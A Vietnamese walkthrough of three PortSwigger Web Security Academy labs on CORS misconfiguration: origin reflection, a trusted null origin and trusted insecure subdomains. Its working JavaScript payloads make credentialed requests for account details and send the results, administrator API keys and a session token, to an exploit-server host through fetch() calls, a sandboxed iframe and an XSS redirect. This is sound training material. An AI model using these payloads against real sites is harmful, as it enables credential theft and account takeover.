Việc cho phép truy cập vào tài nguyên giữa các tên miền khác nhau đôi khi là bắt buộc vì 1 số trang web về mua sắm thì cần phải tin tưởng các trang web ngân hàng khác để có thể thực hiện được việc thanh toán. Còn dài quá, thôi vào bài lab cho dễ hiểu: 

  ### [1. CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)<a name='cor1'></a>
  
  Ta đăng nhập vào tài khoản với wiener:peter :

![image](https://user-images.githubusercontent.com/104350480/225526545-ff433653-1b23-4d7d-9ab7-f2af322aacbf.png)

  Ở phần này ta có thể thấy có thêm sự xuất hiện mới là API Key tại chỗ My Account. Check qua burp suite proxy history, ta sẽ quan sát thấy api Key được trả về thông qua cái asynchronous javascript and xml- gọi ngắn gon là ajax request đến /accountDetails. Đồng thời ta để ý response cũng chứa Access-Control-Allow-Credentials header cho thấy ứng dụng có chứa hỗ trợ CORS và đang được để là true.
  
  
  ![image](https://user-images.githubusercontent.com/104350480/225557507-4dc41852-034f-456a-827b-63e17c0e4d71.png)

  Tất nhiên ở đây ta sẽ không quan tâm đến cái apiKey của th wiener làm gì, cái ta cần là apiKey của th admin cơ. Trước tiên thì ta cần xem là trang web này có bị cấu hình sai cho phép ta khai thác không.
Ta thêm thử Origin bất kì vào bên request, thì có thể thấy ở bên response có trả về giá trị origin ta truyền vào, tức là cái origin nào truyền vào cũng được luôn. Còn nếu đưa ra lỗi thì ta sẽ đến với bài lab sau rồi tính: 
  
  ![image](https://user-images.githubusercontent.com/104350480/225558245-5c152ad5-1df0-4a2a-9c75-3a317dcc647f.png)

  Ở đây ta không chỉ có quyền truy cập tài nguyên từ 1 origin bất kì mà còn có thể tân dụng cái Access-Control-Allow-Credentials: true để không chỉ đọc tài nguyên public mà còn có cả riêng tư. ( ta có thể nhớ lại lí thuyết phần này: Access-Control-Allow-Credentials: true là một header trong CORS cho phép truy cập tài nguyên với thông tin xác thực (credentials) như cookie, HTTP authentication. Khi header này được set là true, trình duyệt sẽ cho phép các yêu cầu AJAX từ trang web gốc (origin) có chứa các thông tin xác thực trong yêu cầu tới các trang web khác (cross-origin) để truy cập các tài nguyên. )
Ta ta có thể sử dụng script như sau để exploit bên phái server và đọc API key: 
  
  ```
  <script>

    var req = new XMLHttpRequest();
    
    var url='https://0aee00f9030e83fbc18e808200650026.web-security-academy.net'

    req.open('GET',url+'/accountDetails',true);

    req.withCredentials = true;
    // onreadystatechange sẽ được gọi mỗi khi trạng thái yêu cầu thay đổi
    req.onreadystatechange = function() {
      if (req.readyState == XMLHttpRequest.DONE){
    // sử dụng phương thức fetch() để gửi một yêu cầu HTTP GET đến đường dẫn '/log', ta để ở đây đường dẫn gì cũng được, tham số cũng vậy, chủ yếu để phân biệt chỗ giá trị ta get về thôi
            fetch('/log?key=' + req.responseText)
    }
    }

    req.send(null);


</script>
  
  ```
  Script trên sẽ yêu cầu trình duyệt gửi đi bất kì cookie nào mà trình duyệt đã lưu trữ
  Truy cập vào phần access Log ta thấy được, có thể thấy quản trị viên đã nhấp vào link ta gửi: 
  
  ![image](https://user-images.githubusercontent.com/104350480/225558967-126730ee-925e-4211-bbf5-9597630b53e9.png)

  > %20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22k1fxK3VjvQF8uSZXS9imoeHxNPYpy4sr%22,%20%20%
  
  Decode url ta được:
  
  >   "username": "administrator",  "email": "",  "apikey": "k1fxK3VjvQF8uSZXS9imoeHxNPYpy4sr",  %
  
  Ở đây ta có dược apiKey của administrator và submit solution ta solve được bài lab: k1fxK3VjvQF8uSZXS9imoeHxNPYpy4sr
  
  Ta cũng có thể thử chính trên server máy của mình để xem đoạn code trên thực thi như thế nào:
  
  ![image](https://user-images.githubusercontent.com/104350480/225596284-f8b6b576-ebe1-4aad-988e-7d885073d0bc.png)

  ![image](https://user-images.githubusercontent.com/104350480/225596326-270faee3-ca52-4210-8f98-79fe664490a9.png)
  
  ![image](https://user-images.githubusercontent.com/104350480/225596251-b3740393-ec87-4046-8ef0-edeb27502362.png)

  Dù trên trang web kh hiển thị gì nhưng ta đã lấy được APIkey của user click vào mà ở đây là wiener.
  
  ### [2. Lab: CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)<a name='cor2'></a>
  
  - Ở bài trước thì cái Access-Allow-origin ta có thể truy cập với bất kì miền nào.
  Ta test thử ở bài này: 
  
  ![image](https://user-images.githubusercontent.com/104350480/225598124-f7405bef-d38b-464b-9a3b-ace7edd06d02.png)

  Có vẻ không thành công, ta sẽ đi thử tiếp với trường null value:
  
  ![image](https://user-images.githubusercontent.com/104350480/225598652-71c28683-b3e7-41c7-9b62-1d3c858d385f.png)

  Oke vậy bài này ta sẽ khai thác với giá trị null, vẫn vậy bài này cho Access-Control-Allow-Credentials: true nên ta có thể khai thác tương tự như trên và gửi cho admin click vào.
Vẫn như đoạn code trên nhưng ta gần phải thêm trường origin là null thì mới có thể tấn công được. Ở đây ta dùng <iframe>:
Ý tưởng để giải quyết bài lab này là ta sẽ sử dụng một iframe để tạo ra một kết nối đến trang web đích và sử dụng JavaScript để thực hiện một yêu cầu CORS bằng XMLHttpRequest. Khi truy cập trang web đích thông qua iframe, địa chỉ nguồn của yêu cầu CORS sẽ được đặt thành "null" cho phép truy cập từ bất kỳ nguồn nào. 
  
  ```
  <h1>Hello world</h1>
<iframe style="display: none" sandbox="allow-scripts" srcdoc="
<script>

    var req = new XMLHttpRequest();
    
    var url='https://0a6e00c80341ecccc128a7a300a50073.web-security-academy.net'

    req.open('GET',url+'/accountDetails',true);

    req.withCredentials = true;
    req.onreadystatechange = function() {
      if (req.readyState == XMLHttpRequest.DONE){
            fetch('https://exploit-0af5009f03baecd1c119a527014f00eb.exploit-server.net/log?key=' + req.responseText)
    }
    };

    req.send(null);


</script>" </iframe>
  
  ```
  
  ![image](https://user-images.githubusercontent.com/104350480/225601927-db0b5eb8-b487-4da3-9876-7d4b7beb120c.png)

  > {%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22YrjgeymGzLj8Hm7ALhSeh4EvNaPbgs61%22,%20%20%22sessions%22:%20[%20%20%20%20%22gh3hzDBNDEpNOoTqdDGqiEibkzhCqGSo%22%20%20]}
  
  Decode:
  
  > {  "username": "administrator",  "email": "",  "apikey": "YrjgeymGzLj8Hm7ALhSeh4EvNaPbgs61",  "sessions": [    "gh3hzDBNDEpNOoTqdDGqiEibkzhCqGSo"  ]}

  
  
  ## [3. Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)<a name='cor3'></a>
  
Mở bài lab, vẫn như bài trước ta mở /accountDetails và test: 
  
  Trường hợp với origin bất kì kh ổn:
  
  ![image](https://user-images.githubusercontent.com/104350480/225615962-a155b7cc-1cca-4b34-b292-7acc0a9b3846.png)

  Và null cũng vậy:
  
  ![image](https://user-images.githubusercontent.com/104350480/225616101-d6d6ac54-3e19-4f32-9671-f44332766ad9.png)

  Bài lab này có vẻ chỉ chấp nhận origin từ chính nó với http và https:
  
  ![image](https://user-images.githubusercontent.com/104350480/225616281-e2e5f6df-b1f8-4145-9474-c15958d671ec.png)

  Nhưng ngoài ra khi ta thử thêm cả trường subdomain vào thì có vẻ ổn:
  
  ![image](https://user-images.githubusercontent.com/104350480/225616445-b4df3b32-12ff-4e96-a434-a9300b864d88.png)
  
  Vậy là ý tưởng của ta bây giờ là cần phải viết script mà sao cho khi nó thực thi thì origin là 1 subdomain của trang web này thì mới tấn công được.
  Bài này thì ý tưởng của người ta mình thấy khá hay, kiểu tìm 1 điểm để thực thi xss mà tại điểm đó có chứa subdomain của miền cần, khi xss được thì trang nó sẽ chứa origin ta cần và việc thực thi thì sẽ được gói gọn bên trong script như các bài trước: 
  
  Khi checkstock thì số lượng được hiển trị trên 1 trang subdomain: 
  
  ![image](https://user-images.githubusercontent.com/104350480/225619517-1e63fe6b-8c29-4f15-a1c0-60e08d14dd75.png)

  Và như ý tưởng của bài lab thì ta tấn công xss vào đây thôi:
  
  ![image](https://user-images.githubusercontent.com/104350480/225620412-b96efc9a-576c-43d4-9ff2-c0d4132c8ddd.png)

  
  Oke giờ xss được thì tiếp theo ta cần truyền scipt bên trong đoạn gây xss là được, trang web sẽ thực thi lấy origin  là trang web có subdomain và thỏa mãn yêu càu:
  
  Đoạn code vẫn dùng:
  
  ```
  <h1>Hello world</h1>


<script>

    var req = new XMLHttpRequest();
    
    var url='https://0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net'

    req.open('GET',url+'/accountDetails',true);

    req.withCredentials = true;
    req.onreadystatechange = function() {
      if (req.readyState == XMLHttpRequest.DONE){
            fetch('https://exploit-0a71005b038a2b56c64f594901da006e.exploit-server.net/exploit/log?key=' + req.responseText)
    }
    }

    req.send(null);


</script>
  
  ```
  
  Nhưng ở đây ta cần chuyển hướng trang sang subdomain và thực thi xss với script như bên trên và khai thác như sau:
  
  ```
  
  <h1>Hello world</h1>
<script>
document.location="https://stock.0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest();var url='https://0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net'
req.open('GET',url+'/accountDetails',true);
req.withCredentials = true;
req.onreadystatechange = function() {
      if (req.readyState == XMLHttpRequest.DONE){
            fetch('https://exploit-0a71005b038a2b56c64f594901da006e.exploit-server.net/exploit/log?key=' %3b req.responseText)
    }
}
req.send(null);
</script>&storeId=1
</script>
  
  ```
  
  Nhưng gửi không được, check lỗi :
  
  ![image](https://user-images.githubusercontent.com/104350480/225622382-1c9ca332-de6c-41a8-85d7-80ddfbd3887c.png)
  
  Ở đây có lỗi "" , ta cần mã hóa lại.

```  
  
    <script>
      document.location="https://stock.0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net/?productId=1<script>var req= new XMLHttpRequest();var url='https://0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net';req.onreadystatechange = function(){if (req.readyState == XMLHttpRequest.DONE){fetch('https://exploit-0a71005b038a2b56c64f594901da006e.exploit-server.net/exploit/log?key=' %2b req.responseText)};};req.open('GET', url %2b '/accountDetails', true);req.withCredentials = true;req.send(null);%3c/script>&storeId=1"
    </script>

   ```

Nhưng mà có vẻ thực thi đoạn trên vẫn bị lỗi, mình cũng chưa hiểu sai chỗ nào luôn, thực hiện vậy mà nó vẫn báo lỗi là kh có access-control-allow-origin. Mà thử 1 đoạn code tương tự lại được: 

  ```
      <script>
    document.location="http://stock.0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a71005b038a2b56c64f594901da006e.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
        
        ````
 ![image](https://user-images.githubusercontent.com/104350480/225642481-c6914ca8-0a86-4f03-b110-4f17536907e2.png)
